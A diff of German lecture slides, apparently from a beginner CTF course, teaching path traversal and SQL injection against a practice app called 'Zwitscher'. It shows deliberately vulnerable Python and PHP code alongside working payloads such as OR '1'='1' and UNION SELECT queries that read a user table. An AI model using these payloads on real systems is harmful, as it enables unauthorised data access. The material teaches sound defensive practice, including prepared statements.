@@ -3,6 +3,76 @@
 
 ---
 
+## Injections
+
+--
+
+## Injections - Beispiel 1
+
+```py
+name = input("Wie heißt du? ")
+
+print(f"Dein Name: '{name}'")
+print()
+
+message = f"Hallo {name}, hab einen schönen Tag!"
+print(message)
+```
+
+--
+
+## Injections
+
+- Output ist einfach nur ein String
+- Es kann nicht zwischen Eingabe und Vorgegebenem unterschieden werden
+- Was, wenn der String weiterverwendet wird?
+
+--
+
+## Injections - Beispiel 2
+
+```py
+name = input("Wie heißt du? ")
+
+print("Dein Name: '" + name + "'")
+
+filename = "./notes/" + name + ".txt"
+print("Lese Datei: " + filename)
+
+print("Inhalt deiner persönlichen Notiz: ")
+
+
+with open(filename, "r") as f:
+    filecontent = f.read()
+    print(filecontent)
+```
+```
+my_notes_system
+├── secret.txt
+├── notes
+│   └── felix.txt
+│   └── mathilde.txt
+└── read_file_injection.py
+```
+
+--
+
+## Injections - Path Traversal
+
+- Wie könnte dieses Verhalten ein Problem darstellen?
+
+```url
+http://www.meinecoolectfwebsite.de/notes/felix
+                                         ─────
+```
+
+```url
+http://www.meinecoolectfwebsite.de/notes/../secret
+                                         ─────────
+```
+
+---
+
 ## SQL
 
 - **S**tructured **Q**uery **L**anguage
@@ -12,9 +82,13 @@
 
 ---
 
-## Übungsumgebung
+zwitscher:
 
-- [Zwitscher](../zwitscher/)
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
 
 ---
 
@@ -22,10 +96,29 @@
 
 - [SELECT ... FROM ... ](http://www.w3schools.com/sql/sql_select.asp) - Selektiere Daten aus Tabelle
 - [WHERE](http://www.w3schools.com/sql/sql_where.asp) - Optional: Formulierung von Bedingungen
+  - [AND](https://www.w3schools.com/sql/sql_and_or.asp)/[OR](https://www.w3schools.com/sql/sql_or.asp) - Bedingungen logisch verknüpfen
 
----
+--
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
+
+```sql
+SELECT username, hashtag, message FROM zwitscher;
+```
+
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
+
+--
+
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
@@ -35,15 +128,15 @@
 SELECT * FROM zwitscher;
 ```
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
 | mischa   | #wisdom | Things always end well. |
 
----
+--
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
@@ -53,13 +146,13 @@ SELECT * FROM zwitscher;
 SELECT * FROM zwitscher WHERE hashtag = '#trivia';
 ```
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 
----
+--
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
@@ -69,28 +162,63 @@ SELECT * FROM zwitscher WHERE hashtag = '#trivia';
 SELECT * FROM zwitscher WHERE hashtag = '#trivia' OR hashtag = '#cat';
 ```
 
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
 
+--
 
-
----
-
-| user     | hashtag | message                 |
+| username | hashtag | message                 |
 |----------|---------|-------------------------|
 | mischa   | #trivia | Viel Spaß beim Hacken   |
 | Flauschi | #cat    | Miau                    |
 | mischa   | #wisdom | Things always end well. |
 
 ```sql
-SELECT user FROM zwitscher WHERE message = 'Things always end well.';
+SELECT * FROM zwitscher WHERE username = 'mischa' AND hashtag = '#cat';
 ```
 
-| user     |
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+
+--
+
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
+
+```sql
+SELECT username FROM zwitscher WHERE message = 'Things always end well.';
+```
+
+| username |
 |----------|
 | mischa   | 
+
+--
+
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
+
+```sql
+SELECT 1,2,3;
+```
+
+| output1 | output2 | output3 |
+|---------|---------|---------|
+| 1       | 2       | 3       |
+
+---
+
+## Übungsumgebung
+
+- [Zwitscher](../zwitscher/)
 
 ---
 
@@ -131,7 +259,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#cat</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23cat)
@@ -150,7 +278,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#cat' OR hashtag = '#trivia</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#cat' OR hashtag='#trivia';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23cat%27+OR+hashtag%3D%27%23trivia)
@@ -169,7 +297,7 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#dog' OR '1'='1</span>
 
 ```php
-$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';
+$sql = "SELECT * FROM zwitscher WHERE hashtag = '#dog' OR '1'='1';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23dog%27+OR+%271%27%3D%271)
@@ -204,6 +332,24 @@ UNION
 SELECT column_name(s) FROM table2;
 ```
 
+--
+
+| username | hashtag | message                 |
+|----------|---------|-------------------------|
+| mischa   | #trivia | Viel Spaß beim Hacken   |
+| Flauschi | #cat    | Miau                    |
+| mischa   | #wisdom | Things always end well. |
+
+```sql
+(SELECT username FROM zwitscher WHERE hashtag = '#trivia') UNION
+(SELECT message FROM zwitscher WHERE hashtag = '#cat');
+```
+
+| username |
+|----------|
+| mischa   |
+| Miau     |
+
 ---
 
 ## Mehr über Zwitscher
@@ -230,9 +376,10 @@ $sql = "SELECT * FROM zwitscher WHERE hashtag = '" . $search . "';";
 Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user</span>
 
 ```php
-$sql = "SELECT *
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT * FROM user';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT * FROM user';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23hashtag%27+UNION+SELECT+*+FROM+user)
@@ -258,9 +405,10 @@ Eingabe: <span style="color:crimson">#dog' UNION SELECT *  FROM user; -- </span>
 ( **Wichtig:** Leerzeichen nach Trennzeichen )
 
 ```php
-$sql = "SELECT *
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT * FROM user; -- ';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT * FROM user; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+*+FROM+user%3B+--+)
@@ -302,9 +450,10 @@ $sql = "SELECT *
 Eingabe: <span style="color:crimson">#dog' UNION SELECT 1; -- </span>
 
 ```php
-$sql = "SELECT *
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1; -- ';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT 1; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%3B+--+)
@@ -318,9 +467,10 @@ $sql = "SELECT *
 Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2; -- </span>
 
 ```php
-$sql = "SELECT * 
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1, 2; -- ';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT 1, 2; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%3B+--+)
@@ -334,9 +484,10 @@ $sql = "SELECT *
 Eingabe: <span style="color:crimson">#dog' UNION SELECT 1, 2, 3; -- </span>
 
 ```php
-$sql = "SELECT *
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT 1, 2, 3; -- ';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT 1, 2, 3; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%27+UNION+SELECT+1%2C+2%2C+3%3B+--+)
@@ -356,9 +507,10 @@ $sql = "SELECT *
 Eingabe: <span style="color:crimson">#dog' UNION SELECT username, mail, age FROM user; -- </span>
 
 ```php
-$sql = "SELECT *
-        FROM zwitscher
-        WHERE hashtag = '#dog' UNION SELECT username, mail, age FROM user; -- ';
+$sql = "SELECT * FROM zwitscher
+        WHERE hashtag = '#dog'
+        UNION
+        SELECT username, mail, age FROM user; -- ';";
 ```
 
 [Code ausführen](../zwitscher/?search=%23dog%27+UNION+SELECT+username%2C+mail%2C+age+FROM+user%3B+--+)
@@ -372,7 +524,6 @@ Bingo!
 - Nicht nur die vorgesehene, sondern auch andere Tabellen können gelesen werden
 
 - Es gibt Probleme:
-
     - Tabellennamen sind nicht immer bekannt
     - Feldnamen sind nicht immer bekannt
 
@@ -401,7 +552,7 @@ Bingo!
 ## Wie mache ich meinen Code sicher?
 
 - Traue keinen Nutzereingaben
-- Benutze keine Abfragen, die aus festen Zeichenketten und Nutzereingaben zusammengesetzt werden
+- Benutze keine Abfragen, die durch simples Zusammensetzten von vorgegebenen Zeichenketten und Nutzereingaben entstehen
 - Benutze sichere Methoden für die Datenbank-Interaktion
 - In PHP z.b.: prepared statements
 
@@ -417,8 +568,8 @@ Es gibt eine dritte Tabelle in [Zwitscher](../zwitscher/)...
 
 ## Aufgaben
 
+- [PicoCTF](https://play.picoctf.org/) Anfängerfreundliches Übungs-CTF. SQLiLite, More SQLi, irish name repo 1/2 sind SQLi. SQL Direct ist allgemein zu SQL. logon ist allgemein zu Web.
 - [Natas](https://overthewire.org/wargames/natas/) Nicht nur SQLi, auch Websicherheit allgemein
-- [PicoCTF](https://play.picoctf.org/) Anfängerfreundliches ÜbungsCTF.  SQLiLite, logon, irish name repo 1/2 sind SQLi.
 
 ---
 
